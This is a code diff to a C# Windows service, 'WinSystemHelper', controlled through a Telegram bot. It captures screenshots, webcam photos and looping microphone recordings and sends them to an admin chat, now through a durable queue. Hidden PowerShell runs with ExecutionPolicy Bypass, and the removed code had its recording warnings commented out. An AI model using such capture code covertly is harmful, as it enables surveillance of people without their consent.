@@ -20,7 +20,7 @@ using Telegram.Bot.Types.ReplyMarkups;
 
 namespace WinSystemHelper;
 
-public sealed class Worker : BackgroundService
+public sealed partial class Worker : BackgroundService
 {
     private static readonly TimeSpan InitialInternetRetryDelay = TimeSpan.FromSeconds(2);
     private static readonly TimeSpan MaxInternetRetryDelay = TimeSpan.FromMinutes(5);
@@ -67,7 +67,6 @@ public sealed class Worker : BackgroundService
     private const string PowerEventLogName = "System";
     private const string PowerEventLogQuery =
         "*[System[(Provider[@Name='User32'] and EventID=1074) or (Provider[@Name='Microsoft-Windows-Kernel-Power'] and EventID=42)]]";
-    private const int MaxPowerEventOutboxFiles = 20;
 
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool GetSystemPowerStatus(out SystemPowerStatus systemPowerStatus);
@@ -146,8 +145,10 @@ public sealed class Worker : BackgroundService
         IProcessRunner processRunner,
         ISharedPathProvider sharedPathProvider,
         ConfigurationFileService configurationFileService,
-        IWindowsSessionProcessRunner windowsSessionProcessRunner)
+        IWindowsSessionProcessRunner windowsSessionProcessRunner,
+        QueueStore queueStore)
     {
+        _queueStore = queueStore;
         _logger = logger;
         _configuration = configuration;
         _botClient = botClient;
@@ -170,13 +171,15 @@ public sealed class Worker : BackgroundService
         return base.StartAsync(cancellationToken);
     }
 
-    public override Task StopAsync(CancellationToken cancellationToken)
+    public override async Task StopAsync(CancellationToken cancellationToken)
     {
         CancelMicLoop();
         _serviceStopping.Cancel();
         UnregisterWakeEventWatcher();
         UnregisterPowerEventWatcher();
-        return base.StopAsync(cancellationToken);
+        await base.StopAsync(cancellationToken);
+        try { await Task.WhenAll(_commandConsumers.Append(_micLoopTask)).WaitAsync(cancellationToken); }
+        catch (OperationCanceledException) { }
     }
 
     protected override async Task ExecuteAsync(CancellationToken stoppingToken)
@@ -202,7 +205,9 @@ public sealed class Worker : BackgroundService
             TelegramSendTimeout,
             workerStopping.Token);
 
-        var offset = 0;
+        var offset = await _queueStore.OffsetAsync();
+        _commandConsumers = [RunCommandQueueAsync(false, workerStopping.Token), RunCommandQueueAsync(true, workerStopping.Token)];
+        await _queueStore.ReportUnknownAsync();
         var pollingFailureAttempt = 0;
 
         while (!workerStopping.Token.IsCancellationRequested)
@@ -222,22 +227,21 @@ public sealed class Worker : BackgroundService
                 pollingFailureAttempt = 0;
                 RecordPollingSuccess();
 
+                if (_telegramPollingFailureStreak == 0 && _queueWasOffline)
+                {
+                    _queueWasOffline = false;
+                    await _queueStore.ConnectedAsync();
+                }
                 foreach (Update update in updates)
                 {
+                    Message? message = update.Message;
+                    string? text = (message?.Text ?? message?.Caption)?.Trim();
+                    bool allowed = message is not null && IsAdminChatId(message.Chat.Id) && !string.IsNullOrWhiteSpace(text);
+                    await _queueStore.AcceptAsync(update.Id, message?.Chat.Id ?? 0,
+                        allowed ? JsonSerializer.Serialize(update) : null,
+                        allowed && CommandPolicy.IsReadOnly(text!), allowed && CommandPolicy.IsControl(text!),
+                        message is null ? QueueStore.Now : new DateTimeOffset(DateTime.SpecifyKind(message.Date, DateTimeKind.Utc)).ToUnixTimeMilliseconds());
                     offset = update.Id + 1;
-
-                    try
-                    {
-                        await HandleUpdateAsync(update, workerStopping.Token);
-                    }
-                    catch (OperationCanceledException) when (workerStopping.Token.IsCancellationRequested)
-                    {
-                        throw;
-                    }
-                    catch (Exception ex)
-                    {
-                        _logger.LogWarning(ex, "Failed to process Telegram update {UpdateId}.", update.Id);
-                    }
                 }
             }
             catch (OperationCanceledException) when (workerStopping.Token.IsCancellationRequested)
@@ -321,13 +325,7 @@ public sealed class Worker : BackgroundService
 
     private async Task SendStartupAlertAsync(CancellationToken cancellationToken)
     {
-        _logger.LogInformation("Startup detected. Waiting for internet connectivity.");
-
-        if (!await WaitForInternetConnectivityAsync(cancellationToken))
-        {
-            _logger.LogWarning("Internet connectivity was not restored before the startup alert was canceled.");
-            return;
-        }
+        _logger.LogInformation("Startup detected. Saving notification to the durable queue.");
 
         string machineName = Environment.MachineName;
         string userName = Environment.UserName;
@@ -342,7 +340,7 @@ public sealed class Worker : BackgroundService
             _lastStartupAlertAt = DateTimeOffset.Now;
         }
 
-        _logger.LogInformation("Startup alert sent.");
+        _logger.LogInformation("Startup alert queued.");
     }
 
     private async Task SendPendingUpdateStatusAsync(CancellationToken cancellationToken)
@@ -358,7 +356,7 @@ public sealed class Worker : BackgroundService
             string status = await File.ReadAllTextAsync(statusMarkerPath, Encoding.UTF8, cancellationToken);
             if (!string.IsNullOrWhiteSpace(status))
             {
-                await SendTelegramBroadcastOnceAsync(status.Trim(), cancellationToken);
+                await ImportLegacyNoticeAsync(statusMarkerPath, status.Trim(), cancellationToken);
             }
         }
         catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
@@ -368,10 +366,6 @@ public sealed class Worker : BackgroundService
         catch (Exception ex)
         {
             _logger.LogWarning(ex, "Failed to read or send pending OTA update status.");
-        }
-        finally
-        {
-            DeleteTempFile(statusMarkerPath);
         }
     }
 
@@ -600,13 +594,7 @@ public sealed class Worker : BackgroundService
 
         try
         {
-            _logger.LogInformation("Resume detected. Waiting for internet connectivity.");
-
-            if (!await WaitForInternetConnectivityAsync(cancellationToken))
-            {
-                _logger.LogWarning("Internet connectivity was not restored before the wake alert was canceled.");
-                return;
-            }
+            _logger.LogInformation("Resume detected. Queuing notification.");
 
             string machineName = Environment.MachineName;
             string userName = Environment.UserName;
@@ -621,7 +609,7 @@ public sealed class Worker : BackgroundService
                 _lastWakeAlertAt = DateTimeOffset.Now;
             }
 
-            _logger.LogInformation("Wake alert sent.");
+            _logger.LogInformation("Wake alert queued.");
         }
         finally
         {
@@ -642,7 +630,7 @@ public sealed class Worker : BackgroundService
 
         try
         {
-            if (await SendTelegramBroadcastOnceAsync(report.Message, cancellationToken))
+            if (await QueuePowerReportAsync(report, cancellationToken))
             {
                 await MarkPowerEventDeliveredAsync(outboxPath, report, cancellationToken);
             }
@@ -690,14 +678,8 @@ public sealed class Worker : BackgroundService
                     continue;
                 }
 
-                bool delivered = await SendTelegramBroadcastOnceAsync(
-                    $"⚠️ Previous power event report: {report.Message} Detected: {report.DetectedAt:yyyy-MM-dd HH:mm:ss zzz}.",
-                    cancellationToken);
-
-                if (delivered)
-                {
-                    DeleteTempFile(file);
-                }
+                await QueuePowerReportAsync(report, cancellationToken);
+                DeleteTempFile(file);
             }
             catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
             {
@@ -709,7 +691,6 @@ public sealed class Worker : BackgroundService
             }
         }
 
-        TrimPowerEventOutbox();
     }
 
     private static PowerEventReport BuildPowerEventReportFromEventLog(EventRecord record)
@@ -795,7 +776,6 @@ public sealed class Worker : BackgroundService
         {
             string directory = GetSharedTempDirectory("PowerEvents");
             Directory.CreateDirectory(directory);
-            TrimPowerEventOutbox();
 
             report.Delivered = delivered;
             string filePath = Path.Combine(
@@ -840,37 +820,6 @@ public sealed class Worker : BackgroundService
         catch (Exception ex) when (ex is IOException or UnauthorizedAccessException or SecurityException)
         {
             _logger.LogWarning(ex, "Failed to mark power event outbox item as delivered.");
-        }
-    }
-
-    private void TrimPowerEventOutbox()
-    {
-        if (!GetPowerEventOutboxEnabled())
-        {
-            return;
-        }
-
-        try
-        {
-            string directory = GetSharedTempDirectory("PowerEvents");
-            if (!Directory.Exists(directory))
-            {
-                return;
-            }
-
-            FileInfo[] files = new DirectoryInfo(directory)
-                .EnumerateFiles("*.json")
-                .OrderByDescending(file => file.LastWriteTimeUtc)
-                .ToArray();
-
-            foreach (FileInfo file in files.Skip(MaxPowerEventOutboxFiles))
-            {
-                DeleteTempFile(file.FullName);
-            }
-        }
-        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException or SecurityException)
-        {
-            _logger.LogWarning(ex, "Failed to trim power event outbox.");
         }
     }
 
@@ -975,6 +924,9 @@ public sealed class Worker : BackgroundService
                 case "/start":
                 case "/help":
                     await SendHelpAsync(cancellationToken);
+                    break;
+                case "/queue":
+                    await HandleQueueCommandAsync(text, cancellationToken);
                     break;
                 case "/status":
                     await SendStatusAsync(cancellationToken);
@@ -1351,6 +1303,7 @@ public sealed class Worker : BackgroundService
             "",
             "📊 Status & Monitoring",
             "/status - Show service, machine, network, and timestamp details.",
+            "/queue - Show queued files and storage capacity; retry or delete by Id.",
             "/healthcheck - Show fast service health and cached state.",
             "/version - Show the installed WinSystemHelper version.",
             "/version check - Check the latest GitHub Release version.",
@@ -1429,11 +1382,8 @@ public sealed class Worker : BackgroundService
             IsPersistent = true
         };
 
-        await _botClient.SendMessage(
-            chatId: GetReplyChatId(),
-            text: text,
-            replyMarkup: keyboard,
-            cancellationToken: timeout.Token);
+        await SendTelegramMessageOnceAsync(text, cancellationToken);
+        await _queueStore.EnqueueTextAsync(GetReplyChatId(), "Command menu", JsonSerializer.Serialize(keyboard));
     }
 
     private async Task SendVersionAsync(string commandText, CancellationToken cancellationToken)
@@ -1524,6 +1474,7 @@ public sealed class Worker : BackgroundService
             expiresAt,
             operation);
 
+        if (CommandExecution.Current.Value is { } execution) execution.ReplyExpires = expiresAt.ToUnixTimeMilliseconds();
         await SendTelegramMessageOnceAsync(
             string.Join(
                 Environment.NewLine,
@@ -1662,7 +1613,7 @@ public sealed class Worker : BackgroundService
         {
             try
             {
-                if (await SendTelegramBroadcastOnceAsync(report.Message, cancellationToken))
+                if (await QueuePowerReportAsync(report, cancellationToken))
                 {
                     await MarkPowerEventDeliveredAsync(outboxPath, report, cancellationToken);
                 }
@@ -2751,6 +2702,7 @@ public sealed class Worker : BackgroundService
             $"DangerousCommandCooldownSeconds: {configuration.DangerousCommandCooldownSeconds}",
             $"MicCooldownSeconds: {configuration.MicCooldownSeconds}",
             $"PersistentMicLoopEnabled: {configuration.PersistentMicLoopEnabled}",
+            $"OutboxMaxSizeMB: {configuration.OutboxMaxSizeMB} (1 MB = 1048576 bytes)",
             $"AllowCrossAdminConfirmations: {configuration.AllowCrossAdminConfirmations}",
             $"PowerEventAlertsEnabled: {configuration.PowerEventAlertsEnabled}",
             $"PowerEventOutboxEnabled: {configuration.PowerEventOutboxEnabled}",
@@ -2778,6 +2730,7 @@ public sealed class Worker : BackgroundService
             configuration.DangerousCommandCooldownSeconds,
             configuration.MicCooldownSeconds,
             configuration.PersistentMicLoopEnabled,
+            configuration.OutboxMaxSizeMB,
             configuration.AllowCrossAdminConfirmations,
             configuration.PowerEventAlertsEnabled,
             configuration.PowerEventOutboxEnabled,
@@ -3174,7 +3127,7 @@ public sealed class Worker : BackgroundService
         {
             string directory = GetSharedTempDirectory(purpose);
             report.Add($"✅ Shared folder ready: {purpose}");
-            int deleted = CleanupOldSharedTempItems(directory, TimeSpan.FromDays(2));
+            int deleted = purpose == "PowerEvents" ? 0 : CleanupOldSharedTempItems(directory, TimeSpan.FromDays(2));
             if (deleted > 0)
             {
                 report.Add($"🧹 Cleaned {deleted} old item(s) from {purpose}");
@@ -3843,134 +3796,8 @@ public sealed class Worker : BackgroundService
         }
     }
 
-    private async Task CaptureAndSendScreenshotAsync(CancellationToken cancellationToken)
-    {
-        string? tempFile = null;
-
-        try
-        {
-            tempFile = Path.Combine(
-                GetSharedTempDirectory("Screen"),
-                $"WinSystemHelper-screen-{Guid.NewGuid():N}.jpg");
-
-            string script = BuildScreenshotScript(tempFile);
-
-            uint exitCode = await _windowsSessionProcessRunner.StartEncodedPowerShellAndWaitAsync(
-                script,
-                ScreenshotTimeout,
-                cancellationToken);
-
-            if (exitCode != 0)
-            {
-                await SendTelegramMessageOnceAsync(
-                    $"⚠️ Screenshot capture failed. ExitCode: {exitCode}.",
-                    cancellationToken);
-                return;
-            }
-
-            FileInfo screenshotFile = new(tempFile);
-            if (!screenshotFile.Exists || screenshotFile.Length == 0)
-            {
-                await SendTelegramMessageOnceAsync("⚠️ Screenshot capture produced no image.", cancellationToken);
-                return;
-            }
-
-            await using FileStream photoStream = File.OpenRead(tempFile);
-            using CancellationTokenSource timeout =
-                CreateTimeoutTokenSource(cancellationToken, TelegramSendTimeout);
-
-            await _botClient.SendPhoto(
-                chatId: GetReplyChatId(),
-                photo: InputFile.FromStream(photoStream, "screen.jpg"),
-                caption: $"🖼️ Screenshot captured at {DateTimeOffset.Now:yyyy-MM-dd HH:mm:ss zzz}.",
-                cancellationToken: timeout.Token);
-        }
-        catch (System.TimeoutException)
-        {
-            await SendTelegramMessageOnceAsync("⏳ Screenshot capture timed out.", CancellationToken.None);
-        }
-        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
-        {
-        }
-        catch (Exception ex)
-        {
-            _logger.LogWarning(ex, "Screenshot command failed.");
-            await SendTelegramMessageOnceAsync($"⚠️ Screenshot failed: {ex.Message}", CancellationToken.None);
-        }
-        finally
-        {
-            DeleteTempFile(tempFile);
-        }
-    }
-
-    private async Task CaptureAndSendCameraAsync(CancellationToken cancellationToken)
-    {
-        string? tempFile = null;
-        string? errorFile = null;
-
-        try
-        {
-            string cameraDirectory = GetSharedTempDirectory("Camera");
-            string captureId = Guid.NewGuid().ToString("N");
-            tempFile = Path.Combine(cameraDirectory, $"WinSystemHelper-camera-{captureId}.jpg");
-            errorFile = Path.Combine(cameraDirectory, $"WinSystemHelper-camera-{captureId}.err.txt");
-
-            TriggerOvertCameraWarning();
-
-            string script = BuildCameraCaptureScript(tempFile, errorFile);
-
-            uint exitCode = await _windowsSessionProcessRunner.StartEncodedPowerShellAndWaitAsync(
-                script,
-                CameraCaptureTimeout,
-                cancellationToken);
-
-            if (exitCode != 0)
-            {
-                string failureReason = await ReadCameraFailureReasonAsync(errorFile, cancellationToken);
-                await SendTelegramMessageOnceAsync(
-                    $"⚠️ Camera capture failed. ExitCode: {exitCode}. Reason: {failureReason}",
-                    cancellationToken);
-                return;
-            }
-
-            FileInfo cameraFile = new(tempFile);
-            if (!cameraFile.Exists || cameraFile.Length == 0)
-            {
-                string failureReason = await ReadCameraFailureReasonAsync(errorFile, cancellationToken);
-                await SendTelegramMessageOnceAsync(
-                    $"⚠️ Camera capture produced no image. Reason: {failureReason}",
-                    cancellationToken);
-                return;
-            }
-
-            await using FileStream photoStream = File.OpenRead(tempFile);
-            using CancellationTokenSource timeout =
-                CreateTimeoutTokenSource(cancellationToken, TelegramSendTimeout);
-
-            await _botClient.SendPhoto(
-                chatId: GetReplyChatId(),
-                photo: InputFile.FromStream(photoStream, "camera.jpg"),
-                caption: $"📷 Camera photo captured at {DateTimeOffset.Now:yyyy-MM-dd HH:mm:ss zzz}.",
-                cancellationToken: timeout.Token);
-        }
-        catch (System.TimeoutException)
-        {
-            await SendTelegramMessageOnceAsync("⏳ Camera capture timed out.", CancellationToken.None);
-        }
-        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
-        {
-        }
-        catch (Exception ex)
-        {
-            _logger.LogWarning(ex, "Camera command failed.");
-            await SendTelegramMessageOnceAsync($"⚠️ Camera capture failed: {GetUsefulExceptionMessage(ex)}", CancellationToken.None);
-        }
-        finally
-        {
-            DeleteTempFile(tempFile);
-            DeleteTempFile(errorFile);
-        }
-    }
+    private Task CaptureAndSendScreenshotAsync(CancellationToken token) => CaptureImageAsync(false, token);
+    private Task CaptureAndSendCameraAsync(CancellationToken token) => CaptureImageAsync(true, token);
 
     private static async Task<string> ReadCameraFailureReasonAsync(
         string? errorFile,
@@ -4118,6 +3945,8 @@ public sealed class Worker : BackgroundService
 
     private async Task StartMicAlarmRecordingAsync(int durationSeconds, CancellationToken cancellationToken)
     {
+        if (_micLoopCts is not null)
+        { await SendTelegramMessageOnceAsync("Recording loop already active. Use /mic stop first.", cancellationToken); return; }
 
         if (!await _micRecordingLock.WaitAsync(0, cancellationToken))
         {
@@ -4127,13 +3956,15 @@ public sealed class Worker : BackgroundService
 
         _micRecordingLock.Release();
 
-        await SendTelegramMessageOnceAsync(
-            $"🎤 Active Alarm triggered. Scaring intruder and recording for {durationSeconds}s...",
-            cancellationToken);
-
-        _ = Task.Run(
-            () => RecordAndSendMicAlarmAsync(durationSeconds, _serviceStopping.Token),
-            _serviceStopping.Token);
+        using var recording = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        lock (_micLoopSync) _singleRecordingCts = recording;
+        try
+        {
+            await SendTelegramMessageOnceAsync(
+                $"🎤 Recording requested ({durationSeconds}s); awaiting local consent.", recording.Token);
+            await RecordAndSendMicAlarmAsync(durationSeconds, recording.Token);
+        }
+        finally { lock (_micLoopSync) _singleRecordingCts = null; }
     }
 
     private async Task StartMicAlarmLoopAsync(int durationSeconds, CancellationToken cancellationToken)
@@ -4174,9 +4005,11 @@ public sealed class Worker : BackgroundService
 
         try
         {
+            _localRecording = await LocalRecordingSession.StartAsync(_queueStore.Root, _windowsSessionProcessRunner, loopCts.Token);
+            TriggerOvertRecordingWarnings();
             if (persistState && GetPersistentMicLoopEnabled())
             {
-                await SavePersistentMicLoopStateAsync(durationSeconds, cancellationToken);
+                await SavePersistentMicLoopStateAsync(durationSeconds, loopCts.Token);
             }
 
             if (restoredFromStartup)
@@ -4192,12 +4025,19 @@ public sealed class Worker : BackgroundService
                 cancellationToken);
             }
 
-            _ = Task.Run(
-                () => RunMicAlarmLoopAsync(durationSeconds, loopCts),
+            _micLoopTask = Task.Run(
+                async () =>
+                {
+                    CommandExecution.Current.Value = null;
+                    await RunMicAlarmLoopAsync(durationSeconds, loopCts);
+                },
                 CancellationToken.None);
         }
         catch
         {
+            loopCts.Cancel();
+            if (_localRecording is not null) { await _localRecording.DisposeAsync(); _localRecording = null; }
+            DeletePersistentMicLoopState();
             lock (_micLoopSync)
             {
                 if (ReferenceEquals(_micLoopCts, loopCts))
@@ -4217,9 +4057,11 @@ public sealed class Worker : BackgroundService
     {
         CancelMicLoop();
         DeletePersistentMicLoopState();
+        if (CommandExecution.Current.Value is { } execution)
+            await _queueStore.CancelOlderRecordingCommandsAsync(execution.Id);
 
         await SendTelegramMessageOnceAsync(
-            "🛑 Persistent Active Alarm stopped.",
+            "🛑 Recording stopped. Saved files remain queued for delivery.",
             cancellationToken);
     }
 
@@ -4230,12 +4072,20 @@ public sealed class Worker : BackgroundService
             return;
         }
 
+        string oldState = Path.Combine(GetSharedTempDirectory("Audio"), MicLoopStateFileName);
+        if (!File.Exists(GetPersistentMicLoopStatePath()) && File.Exists(oldState))
+        {
+            File.Copy(oldState, GetPersistentMicLoopStatePath());
+            DeleteTempFile(oldState);
+        }
         PersistentMicLoopState? state = await ReadPersistentMicLoopStateAsync(cancellationToken);
         if (state is null || !state.Active)
         {
             return;
         }
 
+        if (!IsAdminChatId(state.RequestedByAdminChatId)) { DeletePersistentMicLoopState(); return; }
+        _replyChatId.Value = state.RequestedByAdminChatId;
         int durationSeconds = Math.Clamp(
             state.DurationSeconds <= 0 ? DefaultMicRecordingSeconds : state.DurationSeconds,
             1,
@@ -4273,7 +4123,12 @@ public sealed class Worker : BackgroundService
                 new UTF8Encoding(encoderShouldEmitUTF8Identifier: false),
                 cancellationToken);
 
-            File.Move(tempPath, statePath, overwrite: true);
+            lock (_micLoopSync)
+            {
+                if (_micLoopCts is null || _micLoopCts.IsCancellationRequested || cancellationToken.IsCancellationRequested)
+                { DeleteTempFile(tempPath); cancellationToken.ThrowIfCancellationRequested(); return; }
+                File.Move(tempPath, statePath, overwrite: true);
+            }
         }
         catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
         {
@@ -4317,7 +4172,7 @@ public sealed class Worker : BackgroundService
 
     private string GetPersistentMicLoopStatePath()
     {
-        return Path.Combine(GetSharedTempDirectory("Audio"), MicLoopStateFileName);
+        return Path.Combine(_queueStore.Root, MicLoopStateFileName);
     }
 
     private async Task RunMicAlarmLoopAsync(int durationSeconds, CancellationTokenSource loopCts)
@@ -4328,14 +4183,20 @@ public sealed class Worker : BackgroundService
             {
                 try
                 {
-                    bool cycleCompleted = await RecordAndSendMicAlarmAsync(durationSeconds, loopCts.Token);
+                    if (_localRecording is null || _localRecording.Token.IsCancellationRequested || !IsAdminChatId(GetReplyChatId()))
+                    { DeletePersistentMicLoopState(); break; }
+                    using var active = CancellationTokenSource.CreateLinkedTokenSource(loopCts.Token, _localRecording.Token);
+                    bool cycleCompleted = await RecordAndSendMicAlarmAsync(durationSeconds, active.Token);
                     if (!cycleCompleted)
                     {
-                        await Task.Delay(TimeSpan.FromSeconds(2), loopCts.Token);
+                        if (_queueStore.Paused)
+                            await _queueStore.SpaceChanged.WaitAsync(TimeSpan.FromMinutes(5), active.Token);
+                        else await Task.Delay(TimeSpan.FromSeconds(2), active.Token);
                     }
                 }
-                catch (OperationCanceledException) when (loopCts.IsCancellationRequested)
+                catch (OperationCanceledException) when (loopCts.IsCancellationRequested || _localRecording?.Token.IsCancellationRequested == true)
                 {
+                    if (!loopCts.IsCancellationRequested) DeletePersistentMicLoopState();
                     break;
                 }
                 catch (Exception ex)
@@ -4353,19 +4214,14 @@ public sealed class Worker : BackgroundService
                         _logger.LogWarning(sendException, "Failed to report persistent active alarm loop failure.");
                     }
 
-                    try
-                    {
-                        await Task.Delay(TimeSpan.FromSeconds(2), loopCts.Token);
-                    }
-                    catch (OperationCanceledException) when (loopCts.IsCancellationRequested)
-                    {
-                        break;
-                    }
+                    DeletePersistentMicLoopState();
+                    break;
                 }
             }
         }
         finally
         {
+            if (_localRecording is not null) { await _localRecording.DisposeAsync(); _localRecording = null; }
             lock (_micLoopSync)
             {
                 if (ReferenceEquals(_micLoopCts, loopCts))
@@ -4376,60 +4232,6 @@ public sealed class Worker : BackgroundService
             }
 
             loopCts.Dispose();
-        }
-    }
-
-    private async Task<bool> RecordAndSendMicAlarmAsync(int durationSeconds, CancellationToken cancellationToken)
-    {
-        string? tempFile = null;
-
-        if (!await _micRecordingLock.WaitAsync(0, cancellationToken))
-        {
-            return false;
-        }
-
-        try
-        {
-            //TriggerOvertRecordingWarnings();
-            //TriggerPowerShellBeep();
-
-            tempFile = Path.Combine(
-                GetSharedTempDirectory("Audio"),
-                $"WinSystemHelper-active-alarm-{Guid.NewGuid():N}.wav");
-
-            await RunMicRecorderHelperAsync(tempFile, durationSeconds, cancellationToken);
-
-            await using FileStream voiceStream = File.OpenRead(tempFile);
-            using CancellationTokenSource timeout =
-                CreateTimeoutTokenSource(cancellationToken, TelegramSendTimeout);
-
-            await _botClient.SendVoice(
-                chatId: GetReplyChatId(),
-                voice: InputFile.FromStream(voiceStream, "active-alarm.wav"),
-                duration: durationSeconds,
-                caption: $"🎤 Active Alarm recording ({durationSeconds}s).",
-                cancellationToken: timeout.Token);
-
-            return true;
-        }
-        catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
-        {
-            return false;
-        }
-        catch (Exception ex)
-        {
-            _logger.LogWarning(ex, "Active alarm audio recording failed.");
-            await SendTelegramMessageOnceAsync(
-                $"⚠️ Active Alarm recording failed: {ex.Message}",
-                CancellationToken.None);
-
-            return false;
-        }
-        finally
-        {
-            _micRecordingLock.Release();
-
-            DeleteTempFile(tempFile);
         }
     }
 
@@ -4465,10 +4267,10 @@ public sealed class Worker : BackgroundService
     {
         _windowsSessionProcessRunner.StartProcess(
             "msg.exe",
-            "* \"🚨 SECURITY BREACH: Audio recording is now ACTIVE and being transmitted to the administrator.\"");
+            "* \"🚨 WinSystemHelper: audio recording is active. Files are saved locally and sent to your administrator.\"");
 
         _windowsSessionProcessRunner.StartWindowsPowerShell(
-            "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"(New-Object -ComObject SAPI.SpVoice).Speak('Security alert. Audio recording activated.')\"");
+            "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"(New-Object -ComObject SAPI.SpVoice).Speak('WinSystemHelper. Audio recording activated.')\"");
     }
 
     private void TriggerPowerShellBeep()
@@ -4587,6 +4389,18 @@ public sealed class Worker : BackgroundService
             using System;
             using System.Runtime.InteropServices;
 
+            public sealed class CappedCaptureFile : System.IO.FileStream {
+                private readonly long limit;
+                public CappedCaptureFile(string path, long max) : base(path, System.IO.FileMode.Create, System.IO.FileAccess.ReadWrite) { limit = max; }
+                public override void Write(byte[] buffer, int offset, int count) {
+                    if (Position + count > limit) throw new System.IO.IOException("Image exceeds reserved space.");
+                    base.Write(buffer, offset, count);
+                }
+                public override void SetLength(long value) {
+                    if (value > limit) throw new System.IO.IOException("Image exceeds reserved space.");
+                    base.SetLength(value);
+                }
+            }
             public static class DpiNative {
                 [DllImport("user32.dll")]
                 public static extern bool SetProcessDPIAware();
@@ -4625,7 +4439,10 @@ public sealed class Worker : BackgroundService
 
             try {
                 $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, (New-Object System.Drawing.Size $width, $height))
-                $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                $stream = New-Object CappedCaptureFile $outputPath, 10485760
+                try { $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Jpeg); $stream.Flush($true) }
+                finally { $stream.Dispose() }
+                [IO.File]::WriteAllText($outputPath + '.complete','complete')
                 exit 0
             }
             catch {
@@ -4661,7 +4478,7 @@ public sealed class Worker : BackgroundService
                         New-Item -ItemType Directory -Path $errorDirectory -Force | Out-Null
                     }
 
-                    Set-Content -LiteralPath $errorPath -Value $message -Encoding UTF8
+                    Set-Content -LiteralPath $errorPath -Value 'Camera capture failed locally.' -Encoding UTF8
                 }
                 catch {
                 }
@@ -4725,12 +4542,23 @@ public sealed class Worker : BackgroundService
                 $mediaCapture = New-Object Windows.Media.Capture.MediaCapture
                 Await-Action ($mediaCapture.InitializeAsync($settings))
 
-                $storageFolder = Await-Operation ([Windows.Storage.StorageFolder]::GetFolderFromPathAsync($outputDirectory)) ([Windows.Storage.StorageFolder])
-                $fileName = [System.IO.Path]::GetFileName($outputPath)
-                $storageFile = Await-Operation ($storageFolder.CreateFileAsync($fileName, [Windows.Storage.CreationCollisionOption]::ReplaceExisting)) ([Windows.Storage.StorageFile])
+                [Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType = WindowsRuntime] | Out-Null
+                [Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType = WindowsRuntime] | Out-Null
+                $memory = New-Object Windows.Storage.Streams.InMemoryRandomAccessStream
                 $imageProperties = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
-
-                Await-Action ($mediaCapture.CapturePhotoToStorageFileAsync($imageProperties, $storageFile))
+                $imageProperties.Width = 1920
+                $imageProperties.Height = 1080
+                Await-Action ($mediaCapture.CapturePhotoToStreamAsync($imageProperties, $memory))
+                if ($memory.Size -le 0 -or $memory.Size -gt 10485760) { throw 'Image exceeds reserved capacity.' }
+                $reader = [Windows.Storage.Streams.DataReader]::new($memory.GetInputStreamAt(0))
+                Await-Operation ($reader.LoadAsync([uint32]$memory.Size)) ([uint32]) | Out-Null
+                $bytes = New-Object byte[] ([int]$memory.Size)
+                $reader.ReadBytes($bytes)
+                $output = [IO.File]::Open($outputPath, [IO.FileMode]::Create, [IO.FileAccess]::Write)
+                try { $output.Write($bytes,0,$bytes.Length); $output.Flush($true) } finally { $output.Dispose() }
+                $reader.Dispose()
+                $memory.Dispose()
+                [IO.File]::WriteAllText($outputPath + '.complete','complete')
 
                 $fileInfo = New-Object System.IO.FileInfo $outputPath
                 if (-not $fileInfo.Exists -or $fileInfo.Length -le 0) {
@@ -5454,6 +5282,7 @@ public sealed class Worker : BackgroundService
                 DangerousCommandCooldownSeconds = _configuration.DangerousCommandCooldownSeconds,
                 MicCooldownSeconds = _configuration.MicCooldownSeconds,
                 PersistentMicLoopEnabled = _configuration.PersistentMicLoopEnabled,
+                OutboxMaxSizeMB = _configuration.OutboxMaxSizeMB,
                 AllowCrossAdminConfirmations = _configuration.AllowCrossAdminConfirmations,
                 PowerEventAlertsEnabled = _configuration.PowerEventAlertsEnabled,
                 PowerEventOutboxEnabled = _configuration.PowerEventOutboxEnabled,
@@ -5538,6 +5367,10 @@ public sealed class Worker : BackgroundService
                     _configuration.PowerEventOutboxEnabled = powerEventOutboxEnabled;
                     result = $"PowerEventOutboxEnabled set to {powerEventOutboxEnabled}.";
                     return true;
+                case "outboxmaxsizemb":
+                    return TrySetIntConfigurationValue(value, 1, 65536,
+                        number => { _configuration.OutboxMaxSizeMB = number; _queueStore.ConfigurationChanged(); },
+                        "OutboxMaxSizeMB", out result);
                 case "persistentmicloopenabled":
                     if (!TryParseBoolean(value, out bool persistentMicLoopEnabled))
                     {
@@ -5950,9 +5783,8 @@ public sealed class Worker : BackgroundService
         lock (_micLoopSync)
         {
             CancellationTokenSource? loopCts = _micLoopCts;
-            _micLoopCts = null;
-            _micLoopStartedAt = null;
             _micLoopLongAlertSent = false;
+            _singleRecordingCts?.Cancel();
             loopCts?.Cancel();
             return loopCts;
         }
@@ -6321,6 +6153,11 @@ public sealed class Worker : BackgroundService
         Func<CancellationToken, Task> operation,
         string failureMessage)
     {
+        if (CommandExecution.Current.Value is { } execution)
+        {
+            execution.BackgroundTasks.Enqueue(Task.Run(() => operation(_serviceStopping.Token), _serviceStopping.Token));
+            return;
+        }
         try
         {
             _ = Task.Run(async () =>
@@ -6349,6 +6186,7 @@ public sealed class Worker : BackgroundService
         Exception exception,
         CancellationToken cancellationToken)
     {
+        _queueWasOffline = true;
         RecordPollingFailure(exception);
 
         TimeSpan retryDelay = CalculateBackoff(
